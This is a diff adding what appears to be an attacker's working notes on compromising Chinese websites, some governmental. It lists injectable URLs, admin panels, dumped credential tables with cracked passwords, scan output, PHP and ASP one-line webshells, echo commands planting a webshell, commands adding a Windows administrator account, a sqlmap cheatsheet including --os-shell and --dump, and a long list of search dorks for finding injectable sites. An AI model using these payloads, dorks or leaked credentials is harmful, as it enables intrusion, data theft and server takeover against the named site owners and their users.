@@ -1,0 +1,475 @@
+///////////////////////////////////////////////////////
+http://www.bjsqlw.com/newshow.php?id=680      MySQL
+后台：http://www.bjsqlw.com/admin981/Login.php
++-------+----------------------------------+
+| name  | password                         |
++-------+----------------------------------+
+| admin | 082edcf674cfefd4b7b165373d68f8a7(www.!) |
+| qlh   | 70d2457cf2e2a81b4cbd40ea8a608b6f(qlh.) |
++-------+----------------------------------+
+////////////////////////////////////////////////////////////////
+http://www.gaoneng.com/newsshow.php?id=168 MYSQL
+http://www.gaoneng.com/productshow.php?id=188
++-------+----------+-------------------------------------------+
+| admin | username | password                                  |
++-------+----------+-------------------------------------------+
+| 1     | dengb    | 32baeaa3c422413843b015919c0be999 (821010) |
+| 1     | gaoadmin | 1952f21beefa48df65cb2b70dbe94e29          |
+| 0     | hr       | <blank>                                   |
+| 0     | admin    | <blank>                                   |
++-------+----------+-------------------------------------------+
+Port:
+PORT     STATE    SERVICE
+21/tcp   open     ftp
+22/tcp   open     ssh
+53/tcp   open     domain
+80/tcp   open     http
+135/tcp  filtered msrpc
+139/tcp  filtered netbios-ssn
+443/tcp  open     https
+445/tcp  filtered microsoft-ds
+514/tcp  filtered shell
+593/tcp  filtered http-rpc-epmap
+4444/tcp filtered krb524
+6667/tcp filtered irc
+
++ Server: Microsoft-IIS/6.0
++ Cookie PHPSESSID created without the httponly flag
++ Cookie username created without the httponly flag
++ Retrieved x-powered-by header: PHP/5.2.17
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Retrieved x-aspnet-version header: 2.0.50727
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ RFC-1918 IP address found in the 'location' header. The IP is "192.168.0.252".
++ OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is "http://192.168.0.252/images/".
++ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
++ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
++ /config.php: PHP Config file may contain database IDs and passwords.
++ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ /?-s: PHP allows retrieval of the source code via the -s parameter, and may allow command execution. See http://www.kb.cert.org/vuls/id/520827
+//////////////////////////////////////////////////////////////////////////
+the back-end DBMS is Oracle:
+http://www.hfjs.gov.cn/Dept/news.jsp?item_id=100605 XSS Attacks
+//////////////////////////////////////////////////////////////////////////
+http://dcsxwh.dcjy.net/OK.php 小马
+http://dcsxwh.dcjy.net/usercp_a.php 大马
+
+echo ^<?php eval($_POST[Eliot]); ?^> > C:\sxwh\includes\usercp_viewprofile.php
+echo ^<?php eval($_POST[Eliot]); ?^> > 
+
+PATH:C:\sxwh\includes\file_class.php
+58.117.65.212
+http://dcsxwh.dcjy.net/cat.php?cat_id=103 MySQL
+//////////////////////////////////////////////////////////////////////////
+http://www.jiannongtv.com/news_detail.asp?id=15 ACCESS
+//////////////////////////////////////////////////////////////////////////
+后台：http://www.tyhw.com/news/login.asp
+http://www.tyhw.com/shownews.asp?newsid=24768 ACCESS
+
+www.tyhw.com/news/function/upload.asp
+
+/news/function/upload.asp，行 124
+
++----------+--------+-----------+
+| name     | userid | pwd       |
++----------+--------+-----------+
+| tongying | 2      | 23663116  |
+| fk-jl    | 1      | FL6619132 |
++----------+--------+-----------+
+nikto --host www.tyhw.com
+///////////////////////////////////////////////////////////////////////////
+http://www.dylj.cn/view.php?id=854 MySql
+www.dylj.cn/editor_kindeditor_ok/php/file_manager_json.php
+
+
+sqlmap -u http://www.dylj.cn/view.php?id=854 --password -U admin 
+
+nikto --host www.dylj.cn
+
+www.dylj.cn/userfiles
+Path:E:/www/dylj.cn/guestbook
+Database:
++-----------------+-------------------------------------------+
+| User            | Password                                  |
++-----------------+-------------------------------------------+
+| ljxx8_kdjeij    | *DB6E474BDF5ABF9A7A602C97B3CB7478A4DEB6FE |
+| root            | *7A9C41BEE84B9851D0F911DB406FC8B038318A28(lwx05189)|
+| root            | *7A9C41BEE84B9851D0F911DB406FC8B038318A28 |
+| rotuShuGuanLdot | *504E20734F518C4B6B1B80419E4295911B0BFE2C |
+| rsxt_89k        | *A873ECAC9F63C227BEF6C8A43370F15B2AA315DC(rsxt_89k) |
+| tongxue23ji     | *CFDF98865DD48865F9C3C285826166E402BBB883 |
++-----------------+-------------------------------------------+
+User:
++----------+----------------------------------+
+| username | password                         |
++----------+----------------------------------+
+| admin    | 806b3b64861ada53e4cfcc7df68ae821(wxh) |
+| lj       | e96ed478dab8595a7dbda4cbcbee168f |
++----------+----------------------------------+
+ljxx8_kdjeij
+图书管理后台：
+http://www.dylj.cn/tsgl2/
+实验仪器管理后台：
+http://www.dylj.cn/shiYanYiQi/index.php?action=9876sfi
++----------+----------------------------------+
+| username | password                         |
++----------+----------------------------------+
+| admin    | 9341a1ff112c46074f433d88f5d8b19f(lwx05189) |
+| admin2   | 2d79fbd2c92b874f2964df567b2b0e91(lj8358218) |
++----------+----------------------------------+
+admin3 lwx05189
+
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          218.56.181.105
++ Target Hostname:    www.dylj.cn
++ Target Port:        80
++ Start Time:         2016-06-02 04:08:02 (GMT-4)
+---------------------------------------------------------------------------
++ Server: Apache/2.2.22 (Win32) PHP/5.4.3
++ Retrieved x-powered-by header: PHP/5.4.3
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ OSVDB-3268: /scripts/: Directory indexing found.
++ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
++ PHP/5.4.3 appears to be outdated (current is at least 5.6.9). PHP 5.5.25 and 5.4.41 are also current.
++ RFC-1918 IP address found in the 'location' header. The IP is "172.21.196.2".
++ OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is "http://172.21.196.2/images/".
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
++ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
++ OSVDB-2322: /search.php?searchstring=<script>alert(document.cookie)</script>: Gallery 1.3.4 and below is vulnerable to Cross Site Scripting (XSS). Upgrade to the latest version. http://www.securityfocus.com/bid/8288.
++ OSVDB-50551: /search.php?searchfor=\"><script>alert(1776)</script>: Siteframe 2.2.4 is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-2754: /guestbook/?number=5&lng=%3Cscript%3Ealert(document.domain);%3C/script%3E: MPM Guestbook 1.2 and previous are vulnreable to XSS attacks.
++ OSVDB-3268: /config/: Directory indexing found.
++ /config/: Configuration information may be available remotely.
++ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-2695: /photo/: My Photo Gallery pre 3.6 contains multiple vulnerabilities including directory traversal, unspecified vulnerabilities and remote management interface access.
++ OSVDB-3092: /down/: This might be interesting...
++ OSVDB-3092: /guestbook/: This might be interesting...
++ OSVDB-3092: /scripts/: This might be interesting... possibly a system shell found.
++ OSVDB-3268: /images/: Directory indexing found.
++ OSVDB-3268: /images/?pattern=/etc/*&sort=name: Directory indexing found.
++ OSVDB-3268: /ad/: Directory indexing found.
++ OSVDB-3092: /ad/: This might be interesting... potential country code (Andorra)
++ OSVDB-3092: /test.php: This might be interesting...
++ 9148 requests: 1 error(s) and 30 item(s) reported on remote host
++ End Time:           2016-06-02 04:29:13 (GMT-4) (1271 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+///////////////////////////////////////////////////////////////////////////
+北京埃波托斯科技有限公司
+
+http://www.emotes.com.cn/uploadfile/file/OK.asp;.htm
+http://www.emotes.com.cn/uploadfile/file/20160602/20160602073675987598.rar
+
+net user Test Test /add
+net localgroup administrators Test /add
+
+http://www.emotes.com.cn/common.asp?id=20 ACCESS
+http://www.emotes.com.cn/abs/index.asp
+http://www.emotes.com.cn/abs/xycms.asp
+http://www.emotes.com.cn"%><%eval request("Eliot")%><%'
+Path:D:\PAICLOUD\WEBHOME\EMOTES_COM_CN\HTDOCS\ABS\../inc/config.asp
+D:\PaiCloud\webhome\emotes_com_cn\htdocs\abs\xycms.asp
++----+----------+-------+----------------------------------+
+| id | data     | admin | password                         |
++----+----------+-------+----------------------------------+
+| 1  | 2012-7-3 | admin | 402df6d4ab38b8803c652c66c78fbe4f(zeng2008) |
++----+----------+-------+----------------------------------+
+//////////////////////////////////////////////////////////////////////////
+http://www.yinchen.net/cn/industry.asp?id=38 XSS Attacks
+//////////////////////////////////////////////////////////////////////////
+www.inbond-cn.com
+http://www.inbond-cn.com/FCKeditor/editor/filemanager/browser/default/frmupload.html
+http://www.inbond-cn.com/fckeditor/editor/dialog/fck_image.html
++----+-----------------+----------+------------------+
+| id | title           | username | password         |
++----+-----------------+----------+------------------+
+| 13 | N\\?babMb\\?db? | xianger  | 50e6f3314f778b64(woshidashuaibi) |
+| 3  | N\\?babMb\\?db? | admin    | 2cf8a3beab0297a4(inbond310) |
++----+-----------------+----------+------------------+
+////////////////////////////////////////////////////////////////
+www.wzqyjgj.com
++----+------------+------------------+------------+
+| id | admin_name | admin_pwd        | admin_user |
++----+------------+------------------+------------+
+| 16 | admin      | 82d5fb59fe288909 | admin      |
++----+------------+------------------+------------+
+/////////////////////////////////////////////////////////////////
+http://www.wanshun.com/data/product.php?id=0017-3 MYSQL
+http://www.wanshun.com/2.php
+admin
+
+/var/www/extsuite/wanshun/public/
+pandas
+
+/srv/OK.txt
+Password:Eliot
++---------------+----------------------------------------------------+
+| User          | Password                                           |
++---------------+----------------------------------------------------+
+| extmail       | *2D4B317D0A140050AE5AB99BB10912DD8CFC283D          |
+| hysqld        | *83D34C89B8E0F100D54C6D9276D357DB43E8779F          |
+| root          | *9503666368B5BDCBB4B6CF4E4B29F241026CFD74          |
+| root          | *9503666368B5BDCBB4B6CF4E4B29F221026CFD74          |
+| root          | *9503666368B5BDCBB4B6CF4E4B29F241026CFD74          |
+| roos          | *9503666368B5BDCBB4B6CF4E4B29F241025CFD74          |
+| root          | *9503666368B5BDCBB4B6CF4E4B29F241026CFD74          |
+| root          | *9503666368B5BDCBB4B6CF4E4B29F241026CFD73          |
+| root          | *9503666368B5BDCBB4B6CF4E4B29F241026CFD74          |
+| rolt          | *9503666368B5BDCBB4B6CF4E4B29F241026CFD74          |
+| vpopmail      | <blank>                                            |
+| vpopmail_edit | *9503666368B5BDCBB4B6CF4E4B29F241026CFD74          |
+| webman        | *9F6D6B51EAAF69B7A4D6ABD6CF8D96FC0C675C69 (webman) |
+| webman        | *9F6D6B51EAAF69B7A4D6ABD6CF8D96FC0C675C69 (webman) |
++---------------+----------------------------------------------------+
+///////////////////////////////////////////////////////
+http://www.runtry.com/list.php?id=140 SQLite
+///////////////////////////////////////////////////////
+124.114.152.120
+http://www.snlab.gov.cn/tzggdetail.asp?id=17 SQL
+[*] aspnet_stat
+[*] lab
+[*] master
+[*] model
+[*] msdb
+[*] ReportServer
+[*] ReportServerTempDB
+[*] sxsc_nxy2
+[*] sxsccms_ralasafe
+[*] tempdb
+database management system users password hashes:
+[*] ##MS_PolicyEventProcessingLogin## [1]:
+    password hash: 0x01003869d680adf63db291c6737f1efb8e4a481b02284215913f
+        header: 0x0100
+        salt: 3869d680
+        mixedcase: adf63db291c6737f1efb8e4a481b02284215913f
+
+[*] ##MS_PolicyTsqlExecutionLogin## [1]:
+    password hash: 0x01008d22a249df5ef3b79ed321563a1dccdc9cfc5ff954dd2d0f
+        header: 0x0100
+        salt: 8d22a249
+        mixedcase: df5ef3b79ed321563a1dccdc9cfc5ff954dd2d0f
+
+[*] sa [1]:
+    password hash: 0x01005ce5d04099585b0985d71588c00cc540df95b37d8bf0b026
+        header: 0x0100
+        salt: 5ce5d040
+        mixedcase: 99585b0985d71588c00cc540df95b37d8bf0b026
+//////////////////////////////////////////////////////////////////////////
+python sqlmap.py -u 注入地址 --is-dba   判断当前用户是不是DBA
+python sqlmap.py -u 注入地址 --users    查看当前用户
+python sqlmap.py -u 注入地址 --passwords 查看密码
+python sqlmap.py -u 注入地址 --privileges 查看权限
+python sqlmap.py -u 注入地址 --os-shell  写web shell
+--dbs
+爆库
+-D 库 --tables
+爆表
+-D 库 -T 表 --columns
+爆字段
+-D 库 -T 表 -C 字段 --dump
+脱裤
+-D 库 -T 表 -C 字段 --dump --threads=10 --start=1 --stop=10
+///////////////////////
+awvs
+skipfish
+///////////////////////
+小马：
+<?php @eval($_POST['c']);?>
+<%execute request("e")%>
+///////////////////////
+注入点：
+inurl:asp?id=
+inurl:Article_Print.asp?
+inurl:EnCompHonorBig.asp?id=随便加个数字
+inurl:showproduct.asp?id=随便加个数字 
+inurl:ManageLogin.asp
+inurl:EnCompHonorBig.asp?id= 随便加个数字
+inurl: (asp?=数字) inurl: (php?=数字)
+inurl:Article_Print.asp?
+site 指定网站 inurl:Article_Print.asp?
+inurl:NewsInfo.asp?id=
+inurl:ShowNew.asp?Id=
+inurl:ShowNews.asp?Id=
+inurl:Show.asp?Id=
+inurl:Google dorks sql injection: 
+inurl:index.php?id= 
+inurl:trainers.php?id= 
+inurl:buy.php?category= 
+inurl:article.php?ID= 
+inurllay_old.php?id= 
+inurl:declaration_more.php?decl_id= 
+inurl:ageid= 
+inurl:games.php?id= 
+inurlage.php?file= 
+inurl:newsDetail.php?id= 
+inurl:gallery.php?id= 
+inurl:article.php?id= 
+inurl:show.php?id= 
+inurl:staff_id= 
+inurl:newsitem.php?num= 
+inurl:readnews.php?id= 
+inurl:top10.php?cat= 
+inurl:historialeer.php?num= 
+inurl:reagir.php?num= 
+inurl:Stray-Questions-View.php?num= 
+inurl:forum_bds.php?num= 
+inurl:game.php?id= 
+inurl:view_product.php?id= 
+inurl:newsone.php?id= 
+inurl:sw_comment.php?id= 
+inurl:news.php?id= 
+inurl:avd_start.php?avd= 
+inurl:event.php?id= 
+inurlroduct-item.php?id= 
+inurl:sql.php?id= 
+inurl:news_view.php?id= 
+inurl:select_biblio.php?id= 
+inurl:humor.php?id= 
+inurl:aboutbook.php?id= 
+inurl:fiche_spectacle.php?id= 
+inurl:communique_detail.php?id= 
+inurl:sem.php3?id= 
+inurl:kategorie.php4?id= 
+inurl:news.php?id= 
+inurl:index.php?id= 
+inurl:faq2.php?id= 
+inurl:show_an.php?id= 
+inurlreview.php?id= 
+inurl:loadpsb.php?id= 
+inurl:Opinions.php?id= 
+inurl:spr.php?id= 
+inurlages.php?id= 
+inurl:announce.php?id= 
+inurl:clanek.php4?id= 
+inurlarticipant.php?id= 
+inurl:download.php?id= 
+inurl:main.php?id= 
+inurl:review.php?id= 
+inurl:chappies.php?id= 
+inurl:read.php?id= 
+inurlrod_detail.php?id= 
+inurl:viewphoto.php?id= 
+inurl:article.php?id= 
+inurlerson.php?id= 
+inurlroductinfo.php?id= 
+inurl:showimg.php?id= 
+inurl:view.php?id= 
+inurl:website.php?id= 
+inurl:hosting_info.php?id= 
+inurl:gallery.php?id= 
+inurl:rub.php?idr= 
+inurl:view_faq.php?id= 
+inurl:artikelinfo.php?id= 
+inurl:detail.php?ID= 
+inurl:index.php?= 
+inurlrofile_view.php?id= 
+inurl:category.php?id= 
+inurlublications.php?id= 
+inurl:fellows.php?id= 
+inurl:downloads_info.php?id= 
+inurlrod_info.php?id= 
+inurl:shop.php?do=part&id= 
+inurlroductinfo.php?id= 
+inurl:collectionitem.php?id= 
+inurl:band_info.php?id= 
+inurlroduct.php?id= 
+inurl:releases.php?id= 
+inurl:ray.php?id= 
+inurlroduit.php?id= 
+inurlop.php?id= 
+inurl:shopping.php?id= 
+inurlroductdetail.php?id= 
+inurlost.php?id= 
+inurl:viewshowdetail.php?id= 
+inurl:clubpage.php?id= 
+inurl:memberInfo.php?id= 
+inurl:section.php?id= 
+inurl:theme.php?id= 
+inurlage.php?id= 
+inurl:shredder-categories.php?id= 
+inurl:tradeCategory.php?id= 
+inurlroduct_ranges_view.php?ID= 
+inurl:shop_category.php?id= 
+inurl:transcript.php?id= 
+inurl:channel_id= 
+inurl:item_id= 
+inurl:newsid= 
+inurl:trainers.php?id= 
+inurl:news-full.php?id= 
+inurl:news_display.php?getid= 
+inurl:index2.php?option= 
+inurl:readnews.php?id= 
+inurl:top10.php?cat= 
+inurl:newsone.php?id= 
+inurl:event.php?id= 
+inurlroduct-item.php?id= 
+inurl:sql.php?id= 
+inurl:aboutbook.php?id= 
+inurl:review.php?id= 
+inurl:loadpsb.php?id= 
+inurl:ages.php?id= 
+inurl:material.php?id= 
+inurl:clanek.php4?id= 
+inurl:announce.php?id= 
+inurl:chappies.php?id= 
+inurl:read.php?id= 
+inurl:viewapp.php?id= 
+inurl:viewphoto.php?id= 
+inurl:rub.php?idr= 
+inurl:galeri_info.php?l= 
+inurl:review.php?id= 
+inurl:iniziativa.php?in= 
+inurl:curriculum.php?id= 
+inurl:labels.php?id= 
+inurl:story.php?id= 
+inurl:look.php?ID= 
+inurl:newsone.php?id= 
+inurl:aboutbook.php?id= 
+inurl:material.php?id= 
+inurl:Opinions.php?id= 
+inurl:announce.php?id= 
+inurl:rub.php?idr= 
+inurl:galeri_info.php?l= 
+inurl:tekst.php?idt= 
+inurl:newscat.php?id= 
+inurl:newsticker_info.php?idn= 
+inurl:rubrika.php?idr= 
+inurl:rubp.php?idr= 
+inurl:Offer.php?idf= 
+inurl:art.php?idm= 
+inurl:title.php?id=
+====================
+inurl:CompHonorBig.asp?id=
+inurl:articleshow.asp?articleid=任意数字
+inurl:showproduct.asp?id=
+inurl:ManageLogin.asp 
+inurl:EnCompHonorBig.asp?id= 
+inurl: (asp?=数字) inurl: (php?=数字)
+inurl:Article_Print.asp?
+site inurl:Article_Print.asp?
+inurl:Article_Print.asp?
+inurl:EnCompHonorBig.asp?id=随便加个数字
+inurl:showproduct.asp?id=随便加个数字 
+inurl:ManageLogin.asp
+inurl:EnCompHonorBig.asp?id= 随便加个数字
+inurl: asp?=数字 
+inurl: php?=数字
+inurl:Article_Print.asp?
+site http://www.xmevs.com/ inurl:Article_Print.asp?
+inurl:NewsInfo.asp?id=
+inurl:ShowNew.asp?Id=
+inurl:ShowNews.asp?Id=
+inurl:Show.asp?Id=
